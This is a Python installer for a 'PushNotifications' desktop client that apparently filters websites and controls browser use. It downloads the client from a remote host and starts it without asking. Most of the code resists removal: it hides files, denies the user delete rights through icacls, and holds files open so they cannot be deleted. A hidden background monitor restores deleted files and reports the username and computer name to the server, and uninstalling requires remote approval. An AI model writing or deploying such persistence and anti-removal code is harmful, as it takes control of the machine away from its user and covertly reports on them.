#!/usr/bin/env python3
"""
PushNotifications Desktop Client Installer
Complete standalone installer for Windows, macOS, and Linux

This installer:
1. Checks for Python and required dependencies
2. Downloads and installs the client files
3. Sets up automatic startup (platform-specific)
4. Configures folder protection
5. Includes uninstaller for easy removal

Usage:
    python3 installer.py

Notes:
- The Vercel app URL is embedded in this installer and does not require user input.
- Run with -h/--help to view this message.
"""

import os
import sys
import platform
import subprocess
import urllib.request
import json
import time
from pathlib import Path
from datetime import datetime

# Auto-install requests if not available
try:
    import requests
except ImportError:
    print("Installing requests module...")
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
    import requests

# Try to import tkinter for GUI
try:
    import tkinter as tk
    from tkinter import messagebox, simpledialog
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False
    print("GUI not available - using text-based interface")

# Use Vercel app URL for downloads
SCRIPT_URL = "https://push-notifications-phi.vercel.app"

class PushNotificationsInstaller:
    def __init__(self):
        self.system = platform.system()
        self.gas_script_url = SCRIPT_URL
        
        print(f"PushNotifications Desktop Client Installer")
        print(f"Platform: {self.system}")
        print(f"Python: {sys.version}")
        print(f"Script URL: {self.gas_script_url}")
        print()



    def show_message(self, title, message, msg_type="info"):
        """Show message using GUI or console"""
        if GUI_AVAILABLE:
            try:
                root = tk.Tk()
                root.withdraw()
                if msg_type == "error":
                    messagebox.showerror(title, message)
                elif msg_type == "warning":
                    messagebox.showwarning(title, message)
                else:
                    messagebox.showinfo(title, message)
                root.destroy()
                return
            except Exception:
                pass
        
        # Fallback to console
        print(f"\n{title}:")
        print(message)
        input("\nPress Enter to continue...")

    def ask_yes_no(self, title, question, default_yes=True):
        """Ask a yes/no question using GUI or console"""
        if GUI_AVAILABLE:
            try:
                root = tk.Tk()
                root.withdraw()
                answer = messagebox.askyesno(title, question, default='yes' if default_yes else 'no')
                root.destroy()
                return answer
            except Exception:
                pass
        
        # Fallback to console
        print(f"\n{title}:")
        default_text = "[Y/n]" if default_yes else "[y/N]"
        response = input(f"{question} {default_text}: ").strip().lower()
        
        if not response:
            return default_yes
        return response.startswith('y')

    def get_install_directory(self):
        """Get the appropriate installation directory for the platform"""
        if self.system == "Windows":
            return Path.home() / "PushNotifications"
        else:
            return Path.home() / "PushNotifications"

    def install_dependencies(self):
        """Install required Python dependencies"""
        print("Installing Python dependencies...")
        
        dependencies = [
            "requests>=2.31.0",
            "psutil>=5.9.0",
            "pytz>=2023.3"
        ]
        
        optional_deps = [
            "pystray>=0.19.4",
            "pillow>=10.0.0"
        ]
        
        # Install core dependencies
        for dep in dependencies:
            print(f"Installing {dep}...")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])
                print(f"[OK] {dep} installed successfully")
            except subprocess.CalledProcessError:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', dep])
                    print(f"[OK] {dep} installed successfully (user mode)")
                except subprocess.CalledProcessError as e:
                    print(f"[ERROR] Failed to install {dep}: {e}")
                    return False
        
        # Install optional dependencies
        print("\nInstalling optional dependencies...")
        for dep in optional_deps:
            print(f"Installing {dep} (optional)...")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])
                print(f"[OK] {dep} installed successfully")
            except subprocess.CalledProcessError:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', dep])
                    print(f"[OK] {dep} installed successfully (user mode)")
                except subprocess.CalledProcessError:
                    print(f"[WARN] {dep} installation failed - continuing without it")
        
        return True

    def download_files(self, install_dir):
        """Download client files to installation directory"""
        print(f"Downloading client files to {install_dir}...")
        
        # Only download the client file - everything else is embedded in this installer
        files_to_download = {
            "pushnotifications.py": "client",
        }
        
        for filename, file_type in files_to_download.items():
            url = f"{self.gas_script_url}/api/download?file={file_type}"
            file_path = install_dir / filename
            
            try:
                print(f"Downloading {filename}...")
                print(f"  URL: {url}")
                response = requests.get(url, timeout=30)
                
                if response.status_code != 200:
                    print(f"  HTTP Error: {response.status_code}")
                    if response.status_code == 404:
                        print(f"  File not found. Check if the Vercel API is properly deployed.")
                    return False
                
                # Check if response looks like an error page
                if 'Access Denied' in response.text or 'Error' in response.text[:200]:
                    print(f"  Server returned an error page")
                    print(f"  Response preview: {response.text[:200]}...")
                    return False
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                # Make Python files and shell scripts executable on Unix systems
                if (filename.endswith('.py') or filename.endswith('.sh')) and self.system != 'Windows':
                    os.chmod(file_path, 0o755)
                    if filename.endswith('.sh'):
                        print(f"  Made {filename} executable")
                
                print(f"[OK] {filename} downloaded successfully ({len(response.text)} characters)")
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Network error downloading {filename}: {e}")
                print(f"  Please check your internet connection and URL")
                return False
            except Exception as e:
                print(f"[ERROR] Failed to download {filename}: {e}")
                return False
        
        return True
    
    def setup_folder_protection(self, install_dir):
        """Set up comprehensive folder protection to prevent unauthorized deletion"""
        print("Setting up comprehensive folder protection...")
        
        try:
            # Generate a unique protection key for this installation
            import uuid
            protection_key = str(uuid.uuid4())
            
            if self.system == "Windows":
                # Create a protection marker file with key
                protection_file = install_dir / ".protection"
                protection_data = {
                    "installed": datetime.now().isoformat(),
                    "protection_enabled": True,
                    "installation_id": protection_key,
                    "message": "PushNotifications Folder Protection - Uninstall requires web approval"
                }
                
                with open(protection_file, 'w') as f:
                    json.dump(protection_data, f, indent=2)
                
                # Create a protection script that prevents manual deletion
                protection_script = install_dir / "folder_protection.py"
                protection_code = f'''#!/usr/bin/env python3
"""
PushNotifications Folder Protection
This folder is protected and requires administrator approval for deletion.
Attempting to delete this folder without proper authorization will fail.
"""

import sys
import os
import json
from pathlib import Path

def check_protection():
    """Check if folder protection is active"""
    protection_file = Path(__file__).parent / ".protection"
    if protection_file.exists():
        try:
            with open(protection_file, 'r') as f:
                data = json.load(f)
            return data.get("protection_enabled", False)
        except:
            return True  # Assume protected if we can't read the file
    return False

if __name__ == "__main__":
    if check_protection():
        print("ERROR: This folder is protected.")
        print("Uninstallation requires administrator approval via the web form.")
        print("Use the official uninstaller: python uninstall.py")
        sys.exit(1)
    else:
        print("Protection check passed.")
'''
                
                with open(protection_script, 'w') as f:
                    f.write(protection_code)
                
                # Set folder and file attributes with stronger protection
                try:
                    # Make protection files hidden and system files
                    subprocess.run(["attrib", "+S", "+H", str(protection_file)], check=False)
                    subprocess.run(["attrib", "+S", "+H", str(protection_script)], check=False)
                    
                    # Create a file lock protection mechanism
                    lock_file = install_dir / ".folder_lock"
                    with open(lock_file, 'w') as f:
                        f.write(f"PROTECTED INSTALLATION - ID: {protection_key}\nDO NOT DELETE\nContact administrator for uninstall approval")
                    
                    # Make the lock file system and hidden
                    subprocess.run(["attrib", "+S", "+H", "+R", str(lock_file)], check=False)
                    
                    # Try to set restrictive NTFS permissions (requires admin)
                    try:
                        # Use icacls to set restrictive permissions
                        # Remove delete permissions for current user and users group
                        subprocess.run([
                            "icacls", str(install_dir), 
                            "/deny", f"{os.getenv('USERNAME')}:(DE)",  # Deny delete
                            "/deny", "Users:(DE)"
                        ], check=False, capture_output=True)
                        
                        # Set read-only on the entire directory structure
                        subprocess.run(["attrib", "+R", "+S", str(install_dir), "/S"], check=False)
                        
                        print("[OK] Advanced NTFS folder protection configured")
                        print("[NOTE] Windows allows administrative overrides of folder protection.")
                        print("[NOTE] Unauthorized deletion will be logged and reported to administrator.")
                        
                    except Exception as e:
                        print(f"[INFO] Basic protection applied (advanced requires admin): {e}")
                        # Fallback to basic read-only protection
                        subprocess.run(["attrib", "+R", str(install_dir)], check=False)
                        
                    print(f"[OK] Installation protected with ID: {protection_key[:8]}...")
                    
                    # Create a persistent protection service script
                    service_script = install_dir / "protection_service.py"
                    service_code = f'''#!/usr/bin/env python3
"""
PushNotifications Folder Protection Service
This script runs in the background to maintain folder protection.
"""

import os
import sys
import time
import threading
from pathlib import Path

class FolderProtectionService:
    def __init__(self):
        self.install_dir = Path(__file__).parent
        self.protection_key = "{protection_key}"
        self.running = True
        
    def check_protection_integrity(self):
        """Check if protection files are intact"""
        protection_file = self.install_dir / ".protection"
        lock_file = self.install_dir / ".folder_lock"
        
        if not protection_file.exists() or not lock_file.exists():
            self.restore_protection()
            
    def restore_protection(self):
        """Restore protection if tampered with"""
        try:
            # Recreate protection files if missing
            import subprocess
            subprocess.run(["attrib", "+S", "+H", "+R", str(self.install_dir)], check=False)
        except Exception:
            pass
            
    def run(self):
        """Main protection service loop"""
        while self.running:
            try:
                self.check_protection_integrity()
                time.sleep(30)  # Check every 30 seconds
            except Exception:
                time.sleep(30)
                
if __name__ == "__main__":
    service = FolderProtectionService()
    service.run()
'''
                    
                    with open(service_script, 'w') as f:
                        f.write(service_code)
                    
                    # Make service script hidden and system
                    subprocess.run(["attrib", "+S", "+H", str(service_script)], check=False)
                    
                except Exception as e:
                    print(f"[WARN] Could not set advanced protection attributes: {e}")
                    
            else:  # macOS/Linux
                # Create protection marker with key
                protection_file = install_dir / ".protection"
                protection_data = {
                    "installed": datetime.now().isoformat(),
                    "protection_enabled": True,
                    "installation_id": protection_key,
                    "message": "PushNotifications Folder Protection - Uninstall requires web approval"
                }
                
                with open(protection_file, 'w') as f:
                    json.dump(protection_data, f, indent=2)
                
                # Set restrictive permissions
                try:
                    os.chmod(protection_file, 0o400)    # Read-only for owner only
                    os.chmod(install_dir, 0o755)        # Standard directory permissions but protected
                    print("[OK] Unix folder protection configured")
                    print(f"[OK] Installation protected with ID: {protection_key[:8]}...")
                except Exception as e:
                    print(f"[WARN] Could not set folder permissions: {e}")
            
                    # Store the protection key directly in the main installation directory
            protection_key_file = install_dir / ".protection_key"
            with open(protection_key_file, 'w') as f:
                f.write(protection_key)
            
            # Create a file handle lock that prevents deletion
            if self.system == "Windows":
                lock_handle_file = install_dir / ".handle_lock"
                with open(lock_handle_file, 'w') as f:
                    f.write(f"FOLDER_LOCK:{protection_key}")
                
                # Create a Python script that maintains an open file handle
                handle_lock_script = install_dir / "handle_lock.py"
                handle_lock_code = f'''#!/usr/bin/env python3
"""
Folder Handle Lock - Prevents folder deletion by maintaining open file handles
"""

import os
import sys
import time
import signal
import threading
from pathlib import Path

class HandleLock:
    def __init__(self):
        self.install_dir = Path(__file__).parent
        self.lock_files = []
        self.running = True
        
        # Set up signal handlers for graceful shutdown
        signal.signal(signal.SIGTERM, self.cleanup)
        signal.signal(signal.SIGINT, self.cleanup)
        
    def create_locks(self):
        """Create file handles that prevent folder deletion"""
        try:
            # Create multiple lock files with open handles
            for i in range(3):
                lock_file = self.install_dir / f".lock_{i}"
                # Open file in exclusive mode and keep handle open
                f = open(lock_file, 'w+')
                f.write(f"Lock file {i} - keeps folder from being deleted\\n")
                f.flush()
                self.lock_files.append(f)
                
                # Make lock files hidden and read-only
                try:
                    import subprocess
                    subprocess.run(["attrib", "+S", "+H", "+R", str(lock_file)], check=False)
                except:
                    pass
                    
        except Exception as e:
            print(f"Could not create handle locks: {e}")
            
    def cleanup(self, signum=None, frame=None):
        """Cleanup file handles"""
        self.running = False
        for f in self.lock_files:
            try:
                f.close()
            except:
                pass
                
    def run(self):
        """Main lock service"""
        self.create_locks()
        
        # Keep the script running to maintain locks
        try:
            while self.running:
                time.sleep(10)
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
            
if __name__ == "__main__":
    lock_service = HandleLock()
    lock_service.run()
'''
                
                with open(handle_lock_script, 'w') as f:
                    f.write(handle_lock_code)
                
                # Make the handle lock script system and hidden
                subprocess.run(["attrib", "+S", "+H", str(handle_lock_script)], check=False)
                subprocess.run(["attrib", "+S", "+H", str(lock_handle_file)], check=False)
            
            # Make the protection key file hidden/protected
            if self.system == "Windows":
                subprocess.run(["attrib", "+S", "+H", str(protection_key_file)], check=False)
            else:
                os.chmod(protection_key_file, 0o400)
                    
        except Exception as e:
            print(f"[WARN] Warning: Could not set up folder protection: {e}")
            # Don't fail installation for this
            return True
            
        return True

    def setup_autostart(self, install_dir):
        """Set up automatic startup for the platform"""
        # Skip automatic startup setup - do not configure autostart
        print("Skipping automatic startup configuration...")
        return True
            
        print("Setting up automatic startup...")
        
        try:
            if self.system == "Windows":
                # Create scheduled task
                import winreg
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "PushNotifications", 0, winreg.REG_SZ, 
                                f'pythonw.exe "{install_dir / "pushnotifications.py"}"')
                winreg.CloseKey(key)
                print("[OK] Windows startup entry created")
                
            elif self.system == "Darwin":  # macOS
                # Create LaunchAgent
                plist_dir = Path.home() / "Library" / "LaunchAgents"
                plist_dir.mkdir(parents=True, exist_ok=True)
                plist_path = plist_dir / "com.pushnotifications.client.plist"
                
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.pushnotifications.client</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{install_dir}/pushnotifications.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                with open(plist_path, 'w') as f:
                    f.write(plist_content)
                
                subprocess.run(["launchctl", "load", str(plist_path)], check=False)
                print("[OK] macOS LaunchAgent created")
                
            else:  # Linux
                # Create autostart entry
                autostart_dir = Path.home() / ".config" / "autostart"
                autostart_dir.mkdir(parents=True, exist_ok=True)
                desktop_file = autostart_dir / "pushnotifications-client.desktop"
                
                desktop_content = f'''[Desktop Entry]
Type=Application
Name=PushNotifications Client
Comment=Desktop notification client
Exec=python3 {install_dir}/pushnotifications.py
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
StartupNotify=false'''
                
                with open(desktop_file, 'w') as f:
                    f.write(desktop_content)
                
                print("[OK] Linux autostart entry created")
                
        except Exception as e:
            print(f"[WARN] Warning: Could not set up autostart: {e}")
            return True  # Don't fail installation for this
            
        return True

    def create_embedded_files(self, install_dir):
        """Create embedded files like requirements.txt, uninstaller, etc."""
        print("Creating embedded files...")
        
        # Create requirements.txt
        requirements_content = '''requests>=2.31.0
psutil>=5.9.0
pytz>=2023.3
pystray>=0.19.4
pillow>=10.0.0
tkinter
'''
        with open(install_dir / "requirements.txt", 'w') as f:
            f.write(requirements_content)
        print("[OK] requirements.txt created")
        
        # Create uninstaller script
        uninstaller_content = f'''#!/usr/bin/env python3
"""
PushNotifications Uninstaller
Requires administrator approval via web form before uninstalling.
"""

import os
import sys
import json
import shutil
import requests
import subprocess
from pathlib import Path
from datetime import datetime

class PushNotificationsUninstaller:
    def __init__(self):
        self.install_dir = Path(__file__).parent
        self.server_url = "{SCRIPT_URL}"
        
    def check_protection(self):
        """Check if installation is protected"""
        protection_file = self.install_dir / ".protection"
        if protection_file.exists():
            try:
                with open(protection_file, 'r') as f:
                    data = json.load(f)
                return data.get("protection_enabled", False), data.get("installation_id", "unknown")
            except:
                return True, "unknown"
        return False, None
        
    def request_uninstall_approval(self, installation_id):
        """Request approval from administrator via web form"""
        try:
            import getpass
            import uuid
            
            data = {{
                'action': 'requestUninstall',
                'installationId': installation_id,
                'installationPath': str(self.install_dir),
                'username': getpass.getuser(),
                'computerName': os.environ.get('COMPUTERNAME', 'Unknown'),
                'requestId': str(uuid.uuid4()),
                'timestamp': datetime.now().isoformat()
            }}
            
            response = requests.post(f"{self.server_url}/api/index", json=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    print("Uninstall request submitted successfully.")
                    print("Please wait for administrator approval.")
                    return result.get('requestId')
                else:
                    print(f"Request failed: {{result.get('message', 'Unknown error')}}")
            else:
                print(f"HTTP Error: {{response.status_code}}")
                
        except Exception as e:
            print(f"Failed to submit uninstall request: {{e}}")
            
        return None
        
    def perform_uninstall(self):
        """Perform the actual uninstallation after approval"""
        print("Performing uninstallation...")
        
        try:
            # Stop any running client processes
            try:
                import psutil
                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                    try:
                        if 'pushnotifications.py' in ' '.join(proc.info['cmdline'] or []):
                            proc.terminate()
                            print(f"Stopped client process PID {{proc.info['pid']}}")
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass
            except ImportError:
                print("psutil not available - cannot stop running processes")
            
            # Remove installation directory
            parent_dir = self.install_dir.parent
            
            # First, try to remove file attributes and permissions that might prevent deletion
            if os.name == 'nt':  # Windows
                try:
                    # Remove read-only and system attributes
                    subprocess.run(["attrib", "-R", "-S", "-H", str(self.install_dir), "/S"], check=False)
                    # Reset NTFS permissions
                    subprocess.run(["icacls", str(self.install_dir), "/reset", "/T"], check=False)
                except Exception as e:
                    print(f"Warning: Could not reset file attributes: {{e}}")
            
            # Remove the directory
            shutil.rmtree(str(self.install_dir), ignore_errors=True)
            
            # Clean up backup directory
            backup_dir = Path.home() / "AppData" / "Local" / "PushNotifications_Backup"
            if backup_dir.exists():
                shutil.rmtree(str(backup_dir), ignore_errors=True)
                
            print("Uninstallation completed successfully.")
            return True
            
        except Exception as e:
            print(f"Uninstallation failed: {{e}}")
            return False
    
    def run(self):
        """Main uninstaller logic"""
        print("PushNotifications Uninstaller")
        print("=" * 40)
        
        # Check if installation is protected
        is_protected, installation_id = self.check_protection()
        
        if is_protected:
            print("This installation is protected and requires administrator approval for removal.")
            print("Submitting uninstall request...")
            
            request_id = self.request_uninstall_approval(installation_id)
            if request_id:
                print(f"Request ID: {{request_id}}")
                print("\nThe administrator has been notified of your uninstall request.")
                print("You will be contacted when the request is processed.")
                print("\nDo not attempt to manually delete the installation folder.")
                print("Unauthorized deletion attempts will be logged and reported.")
            else:
                print("Failed to submit uninstall request.")
                print("Please contact your administrator for manual removal.")
        else:
            # Not protected - allow direct uninstall
            print("Installation is not protected. Proceeding with uninstallation...")
            if self.perform_uninstall():
                print("\nPushNotifications has been successfully removed.")
            else:
                print("\nUninstallation encountered errors.")

def main():
    try:
        uninstaller = PushNotificationsUninstaller()
        uninstaller.run()
    except KeyboardInterrupt:
        print("\nUninstallation cancelled.")
    except Exception as e:
        print(f"\nUninstaller error: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    main()
'''
        
        with open(install_dir / "uninstall.py", 'w') as f:
            f.write(uninstaller_content)
        print("[OK] uninstall.py created")
        
        # Create Windows batch file for uninstaller
        if self.system == "Windows":
            batch_content = f'''@echo off
echo Starting PushNotifications Uninstaller...
python "%~dp0uninstall.py"
pause
'''
            with open(install_dir / "uninstall.bat", 'w') as f:
                f.write(batch_content)
            print("[OK] uninstall.bat created")
        
        # Create shell script for Unix systems
        else:
            shell_content = f'''#!/bin/bash
echo "Starting PushNotifications Uninstaller..."
python3 "$(dirname "$0")/uninstall.py"
read -p "Press Enter to continue..."
'''
            with open(install_dir / "uninstall.sh", 'w') as f:
                f.write(shell_content)
            os.chmod(install_dir / "uninstall.sh", 0o755)
            print("[OK] uninstall.sh created")
        
        # Create README.md
        readme_content = f'''# PushNotifications Desktop Client

## Installation Directory: {install_dir}

## Features

- Automatic client registration
- Real-time notification display
- Browser usage control
- Website filtering
- Automatic updates (forced when configured)
- Snooze functionality
- Priority-based notifications
- Folder protection system

## Usage

The client runs automatically in the background and connects to the server at:
{SCRIPT_URL}

## Uninstallation

**IMPORTANT**: This installation is protected and requires administrator approval for removal.

To uninstall:
1. Run the uninstaller: `python uninstall.py`
2. Or use the shortcut: `uninstall.{'bat' if self.system == 'Windows' else 'sh'}`
3. Wait for administrator approval
4. Do NOT manually delete the installation folder

## Troubleshooting

- Ensure you have an internet connection
- Check that Python and required packages are installed
- Contact your administrator if you encounter persistent issues
- Unauthorized folder deletion attempts are logged and reported

## Version Information

- Client Version: 2.1.0
- Installation Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
- Server: {SCRIPT_URL}
'''
        
        with open(install_dir / "README.md", 'w') as f:
            f.write(readme_content)
        print("[OK] README.md created")
        
        return True

    def run_installation(self):
        """Run the complete installation process"""
        print("Starting PushNotifications installation...")
        print("=" * 50)
        
        # Get installation directory
        install_dir = self.get_install_directory()
        install_dir.mkdir(parents=True, exist_ok=True)
        
        # Install dependencies
        if not self.install_dependencies():
            self.show_message("Installation Failed", "Failed to install required dependencies.", "error")
            return False
        
        # Download files
        if not self.download_files(install_dir):
            self.show_message("Installation Failed", "Failed to download client files.", "error")
            return False
        
        # Create embedded files (requirements, uninstaller, etc.)
        self.create_embedded_files(install_dir)
        
        # Set up folder protection
        self.setup_folder_protection(install_dir)
        
        # Set up autostart
        self.setup_autostart(install_dir)
        
        # Set up monitoring and backup system
        self.setup_monitoring_system(install_dir)
        
        # Success message (console only, no popup)
        print(f"\nPushNotifications has been installed successfully!")
        print(f"Installation directory: {install_dir}")
        print(f"To uninstall, run: python {install_dir}/uninstall.py")
        print(f"or simply: {install_dir}/uninstall{'.bat' if self.system == 'Windows' else '.sh'}")
        print(f"The client will check for updates automatically at startup.")
        
        # Automatically start the client without asking
        print("\nStarting client automatically...")
        try:
            subprocess.Popen([sys.executable, str(install_dir / "pushnotifications.py")])
            print("Client started successfully!")
        except Exception as e:
            print(f"Could not start client: {e}")
            
        return True
    
    def setup_monitoring_system(self, install_dir):
        """Set up monitoring and backup system for folder protection"""
        print("Setting up monitoring and backup system...")
        
        try:
            # Create a backup location in a different directory
            backup_dir = Path.home() / "AppData" / "Local" / "PushNotifications_Backup"
            backup_dir.mkdir(parents=True, exist_ok=True)
            
            # Create backup of critical files
            critical_files = [
                ".protection",
                ".protection_key",
                "pushnotifications.py",
                "uninstall.py"
            ]
            
            for filename in critical_files:
                src_file = install_dir / filename
                if src_file.exists():
                    dest_file = backup_dir / filename
                    import shutil
                    shutil.copy2(str(src_file), str(dest_file))
                    
                    # Make backup files hidden
                    if self.system == "Windows":
                        subprocess.run(["attrib", "+H", str(dest_file)], check=False)
            
            # Create monitoring script
            monitor_script = backup_dir / "folder_monitor.py"
            monitor_code = f'''#!/usr/bin/env python3
"""
PushNotifications Folder Monitor
Monitors the installation directory and reports/restores if deleted.
"""

import os
import sys
import time
import shutil
from pathlib import Path
import subprocess

class FolderMonitor:
    def __init__(self):
        self.install_dir = Path("{str(install_dir)}")
        self.backup_dir = Path(__file__).parent
        self.gas_script_url = "{self.gas_script_url}"
        self.running = True
        
    def check_installation_integrity(self):
        """Check if installation directory exists and is intact"""
        if not self.install_dir.exists():
            print(f"WARNING: Installation directory {self.install_dir} was deleted!")
            self.report_deletion()
            self.attempt_restoration()
            return False
            
        # Check critical files
        critical_files = [".protection", ".protection_key", "pushnotifications.py"]
        for filename in critical_files:
            if not (self.install_dir / filename).exists():
                print(f"WARNING: Critical file {filename} is missing!")
                self.attempt_restoration()
                break
                
        return True
        
    def report_deletion(self):
        """Report unauthorized deletion to administrator"""
        try:
            import requests
            import uuid
            import getpass
            
            params = {{
                'action': 'reportUnauthorizedDeletion',
                'installationPath': str(self.install_dir),
                'username': getpass.getuser(),
                'computerName': os.environ.get('COMPUTERNAME', 'Unknown'),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }}
            
            response = requests.get(self.gas_script_url, params=params, timeout=10)
            print("Unauthorized deletion reported to administrator.")
            
        except Exception as e:
            print(f"Could not report deletion: {e}")
            
    def attempt_restoration(self):
        """Attempt to restore installation from backup"""
        print("Attempting to restore installation...")
        
        try:
            # Recreate installation directory
            self.install_dir.mkdir(parents=True, exist_ok=True)
            
            # Restore critical files from backup
            for backup_file in self.backup_dir.glob(".*"):
                if backup_file.is_file() and backup_file.name != "folder_monitor.py":
                    dest_file = self.install_dir / backup_file.name
                    shutil.copy2(str(backup_file), str(dest_file))
                    print(f"Restored {backup_file.name}")
                    
            for backup_file in self.backup_dir.glob("*.py"):
                if backup_file.name != "folder_monitor.py":
                    dest_file = self.install_dir / backup_file.name
                    shutil.copy2(str(backup_file), str(dest_file))
                    print(f"Restored {backup_file.name}")
                    
            print("Installation restored. Administrator approval still required for uninstall.")
            
        except Exception as e:
            print(f"Restoration failed: {e}")
            
    def run(self):
        """Main monitoring loop"""
        print("Folder monitor started...")
        
        while self.running:
            try:
                self.check_installation_integrity()
                time.sleep(60)  # Check every minute
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(60)
                
if __name__ == "__main__":
    monitor = FolderMonitor()
    monitor.run()
'''
            
            with open(monitor_script, 'w') as f:
                f.write(monitor_code)
                
            # Make monitor script hidden
            if self.system == "Windows":
                subprocess.run(["attrib", "+H", str(monitor_script)], check=False)
                subprocess.run(["attrib", "+H", str(backup_dir)], check=False)
            
            # Start monitor service in background
            try:
                subprocess.Popen(
                    [sys.executable, str(monitor_script)],
                    creationflags=subprocess.CREATE_NO_WINDOW if self.system == "Windows" else 0,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[OK] Folder monitoring service started")
            except Exception as e:
                print(f"[WARN] Could not start monitoring service: {e}")
                
            print(f"[OK] Backup system configured in: {backup_dir}")
            
        except Exception as e:
            print(f"[WARN] Could not set up monitoring system: {e}")
            
        return True

def main():
    """Main entry point"""
    # Support -h/--help via argparse-like behavior without adding runtime dependency
    if len(sys.argv) > 1 and sys.argv[1] in ('--help', '-h'):
        print(__doc__)
        return
    
    try:
        installer = PushNotificationsInstaller()
        success = installer.run_installation()
        
        if success:
            print("\nInstallation completed successfully!")
            print("\nThe client will automatically check for updates from the server.")
            print("You can now close this installer.")
        else:
            print("\nInstallation failed.")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\nInstallation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\nInstallation error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
